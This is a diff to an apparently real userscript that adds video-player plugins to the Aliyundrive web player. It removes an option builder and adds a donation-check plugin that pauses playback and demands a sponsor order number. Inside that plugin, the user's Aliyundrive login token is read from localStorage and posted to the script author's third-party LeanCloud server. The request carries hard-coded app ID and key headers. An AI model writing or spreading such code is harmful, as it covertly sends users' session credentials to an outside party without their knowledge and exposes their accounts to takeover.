@@ -46,137 +46,6 @@ window.alipanArtPlugins =
         });
         return Promise.resolve(i);
       },
-      initOption: function (t) {
-        const e = {
-            container: "#artplayer",
-            url: "",
-            quality: [],
-            type: "hls",
-            autoplay: !0,
-            autoPlayback: !0,
-            aspectRatio: !0,
-            contextmenu: [
-              {
-                html: "检查更新",
-                click: function (t, e) {
-                  window.open(
-                    "https://scriptcat.org/zh-CN/script-show-page/162",
-                    "_blank"
-                  ),
-                    (t.show = !1);
-                },
-              },
-              {
-                html: "加油作者",
-                click: function (t, e) {
-                  this?.plugins?.aifadian.show(), (t.show = !1);
-                },
-              },
-            ],
-            customType: {
-              hls: function (t, e, n) {
-                const s = window.Hls || unsafeWindow.Hls;
-                if (s.isSupported()) {
-                  n.hls && n.hls.destroy();
-                  const i = new s({ maxBufferLength: 60 });
-                  i.loadSource(e),
-                    i.attachMedia(t),
-                    (n.hls = i),
-                    n.on("destroy", () => i.destroy());
-                } else
-                  t.canPlayType("application/vnd.apple.mpegurl")
-                    ? (t.src = e)
-                    : (n.notice.show = "Unsupported playback format: m3u8");
-              },
-            },
-            flip: !0,
-            icons: {
-              loading:
-                '<img src="https://artplayer.org/assets/img/ploading.gif">',
-              state:
-                '<img width="150" heigth="150" src="https://artplayer.org/assets/img/state.svg">',
-              indicator:
-                '<img width="16" heigth="16" src="https://artplayer.org/assets/img/indicator.svg">',
-            },
-            id: "",
-            pip: !0,
-            playbackRate: !0,
-            screenshot: !0,
-            setting: !0,
-            subtitle: {
-              url: "",
-              type: "vtt",
-              style: { color: "#fe9200", fontSize: "25px" },
-              encoding: "utf-8",
-            },
-            subtitleOffset: !1,
-            hotkey: !0,
-            fullscreen: !0,
-            fullscreenWeb: !0,
-          },
-          { video_info: n, video_file: s, video_items: i } = t || {},
-          a = s || {},
-          o = a.file_id;
-        o && Object.assign(e, { file: a, id: o });
-        const {
-            live_transcoding_subtitle_task_list: r,
-            live_transcoding_task_list: l,
-            meta: c,
-            quick_video_list: u,
-            quick_video_subtitle_list: p,
-          } = n?.video_preview_play_info || {},
-          d = u || l;
-        if (!Array.isArray(d) || !d.length) return e;
-        {
-          const t = {
-            QHD: "2K 超清",
-            QHD: "1440 超清",
-            FHD: "1080 全高清",
-            HD: "720 高清",
-            SD: "540 标清",
-            LD: "360 流畅",
-          };
-          d.forEach((e, n) => {
-            Object.assign(e, {
-              html:
-                t[e.template_id] +
-                (e.description ? "（三方VIP）" : e.url ? "" : "（VIP）"),
-              type: "hls",
-            });
-          }),
-            d.sort((t, e) => t.template_height - e.template_height),
-            (d.findLast((t) => t.url).default = !0),
-            Object.assign(e, { quality: d });
-        }
-        const { url: h, type: f } = d.find((t) => t.default) || d[0] || {};
-        if (!h || !f) return e;
-        Object.assign(e, { url: h, type: f });
-        const m = p || r;
-        if (Array.isArray(m) && m.length) {
-          const t = { chi: "中文字幕", eng: "英文字幕", jpn: "日文字幕" };
-          m.forEach(function (e, n) {
-            Object.assign(e, {
-              html: (t[e.language] || e.language || "未知语言") + "（vtt）",
-              name: "内置字幕",
-              type: "vtt",
-            });
-          }),
-            ((
-              m.find((t) => ["chi"].includes(t.language)) ||
-              m.find((t) => t.url) ||
-              {}
-            ).default = !0),
-            Object.assign(e, { subtitlelist: m });
-        }
-        const g = i || [];
-        return (
-          Array.isArray(g) &&
-            g.length &&
-            (((g.find((t) => t.file_id === o) || {}).default = !0),
-            Object.assign(e, { playlist: g })),
-          e
-        );
-      },
       loadJs: function (t) {
         return (
           window.instances || (window.instances = {}),
@@ -965,6 +834,199 @@ window.alipanArtPlugins =
                 })));
           }),
           { name: "sound" }
+        );
+      };
+    },
+    function () {
+      return (t) => {
+        const e = window.localforage || unsafeWindow.localforage;
+        let n;
+        function s() {
+          let t = document.createElement("div");
+          (t.innerHTML =
+            '<div class="ant-modal-mask"></div><div tabindex="-1" class="ant-modal-wrap" role="dialog" aria-labelledby="rcDialogTitle1" style=""><div role="document" class="ant-modal modal-wrapper--5SA7y" style="width: 340px;"><div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div><div class="ant-modal-content"><div class="ant-modal-header"><div class="ant-modal-title" id="rcDialogTitle1">请少量赞助以支持我更好的创作</div></div><div class="ant-modal-body"><div class="content-wrapper--S6SNu"><div>爱发电订单号：</div><span class="ant-input-affix-wrapper ant-input-affix-wrapper-borderless ant-input-password input--TWZaN input--l14Mo"><input placeholder="" action="click" type="text" class="ifdian-order ant-input ant-input-borderless" style="background-color: var(--divider_tertiary);"></span></div><div class="content-wrapper--S6SNu"><div>请输入爱发电订单号，确认即可</div><a href="https://ifdian.net/order/create?plan_id=be4f4d0a972811eda14a5254001e7c00" target="_blank"> 前往爱发电 </a><a href="https://ifdian.net/dashboard/order" target="_blank"> 复制订单号 </a></div></div><div class="ant-modal-footer"><div class="footer--cytkB"><button class="button--WC7or secondary--vRtFJ small--e7LRt cancel-button--c-lzN">取消</button><button class="button--WC7or primary--NVxfK small--e7LRt">确定</button></div></div></div><div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div></div></div>'),
+            document.body.insertBefore(t, null),
+            t.querySelectorAll("button").forEach((n, s) => {
+              n.addEventListener("click", () => {
+                if (0 == s) document.body.removeChild(t);
+                else {
+                  let n = t.querySelector("input").value;
+                  if (n)
+                    if (n.match(/^202[\d]{22,25}$/)) {
+                      if (n.match(/(\d)\1{8,}/g)) return;
+                      e.getItem("users")
+                        .then((t) => {
+                          var s;
+                          (t && t.ON == n) ||
+                            ((s = n),
+                            a().then(
+                              (t) => (
+                                0 === Date.parse(t.expire_time) ||
+                                  e
+                                    .setItem(
+                                      "users",
+                                      Object.assign(t || {}, {
+                                        expire_time: new Date(
+                                          Date.now() + 864e3
+                                        ).toISOString(),
+                                      })
+                                    )
+                                    .then((t) => {
+                                      e.setItem(
+                                        "users_sign",
+                                        btoa(
+                                          encodeURIComponent(JSON.stringify(t))
+                                        )
+                                      ),
+                                        GM_setValue(
+                                          "users_sign",
+                                          btoa(
+                                            encodeURIComponent(
+                                              JSON.stringify(t)
+                                            )
+                                          )
+                                        );
+                                    }),
+                                (function (t, e) {
+                                  return (
+                                    delete t.createdAt,
+                                    delete t.updatedAt,
+                                    delete t.objectId,
+                                    o({
+                                      url: "https://sxxf4ffo.lc-cn-n1-shared.com/1.1/classes/aliyundrive",
+                                      data: JSON.stringify(
+                                        Object.assign(t, { ON: e })
+                                      ),
+                                    })
+                                  );
+                                })(t, s)
+                              )
+                            )).catch(() => {
+                              alert("网络错误，请稍后再次提交");
+                            });
+                        })
+                        .catch(function (t) {
+                          alert(t);
+                        });
+                    } else alert("订单号不合规范，请重试");
+                  document.body.removeChild(t);
+                }
+              });
+            });
+        }
+        function i() {
+          return e
+            .getItem("users")
+            .then((t) =>
+              t?.expire_time
+                ? e
+                    .getItem("users_sign")
+                    .then((n) =>
+                      Math.max(Date.parse(t.expire_time) - Date.now(), 0) &&
+                      n === btoa(encodeURIComponent(JSON.stringify(t))) &&
+                      GM_getValue("users_sign") ===
+                        btoa(encodeURIComponent(JSON.stringify(t)))
+                        ? t
+                        : a().then((t) =>
+                            Math.max(Date.parse(t?.expire_time) - Date.now(), 0)
+                              ? e
+                                  .setItem("users", t)
+                                  .then(
+                                    (t) => (
+                                      e.setItem(
+                                        "users_sign",
+                                        btoa(
+                                          encodeURIComponent(JSON.stringify(t))
+                                        )
+                                      ),
+                                      GM_setValue(
+                                        "users_sign",
+                                        btoa(
+                                          encodeURIComponent(JSON.stringify(t))
+                                        )
+                                      ),
+                                      t
+                                    )
+                                  )
+                              : (e.removeItem("users"),
+                                e.removeItem("users_sign"),
+                                GM_deleteValue("users_sign"),
+                                Promise.reject())
+                          )
+                    )
+                : GM_getValue("users_sign")
+                ? e
+                    .setItem("users", { expire_time: new Date().toISOString() })
+                    .then(() => i())
+                : (GM_setValue("users_sign", 0), Promise.reject())
+            );
+        }
+        function a() {
+          return (
+            (t = (function (t) {
+              if (!(t = localStorage.getItem(t))) return null;
+              try {
+                return JSON.parse(t);
+              } catch (e) {
+                return t;
+              }
+            })("token")),
+            o({
+              url: "https://sxxf4ffo.lc-cn-n1-shared.com/1.1/users",
+              data: JSON.stringify({
+                authData: {
+                  aliyundrive: Object.assign(t, {
+                    uid: t?.user_id,
+                    scriptHandler: GM_info?.scriptHandler,
+                    version: GM_info?.script?.version,
+                  }),
+                },
+              }),
+            })
+          );
+          var t;
+        }
+        function o(t) {
+          return new Promise(function (e, n) {
+            GM_xmlhttpRequest
+              ? GM_xmlhttpRequest({
+                  method: "post",
+                  headers: {
+                    "Content-Type": "application/json",
+                    "X-LC-Id": "sXXf4FFOZn2nFIj7LOFsqpLa-gzGzoHsz",
+                    "X-LC-Key": "16s3qYecpVJXtVahasVxxq1V",
+                  },
+                  responseType: "json",
+                  onload: function (t) {
+                    if (2 == parseInt(t.status / 100)) {
+                      var s = t.response || t.responseText;
+                      e(s);
+                    } else n(t);
+                  },
+                  onerror: function (t) {
+                    n(t);
+                  },
+                  ...t,
+                })
+              : n();
+          });
+        }
+        return (
+          t.once("video:playing", function () {
+            const e = new Date();
+            n = setInterval(() => {
+              const n = new Date() - e;
+              Math.floor((n / 1e3 / 60) % 60) % 9 ||
+                !t.playing ||
+                i().catch((e) => {
+                  t.pause(), s();
+                });
+            }, 6e3);
+          }),
+          t.once("destroy", function () {
+            clearInterval(n);
+          }),
+          { name: "aifadian", show: s }
         );
       };
     },
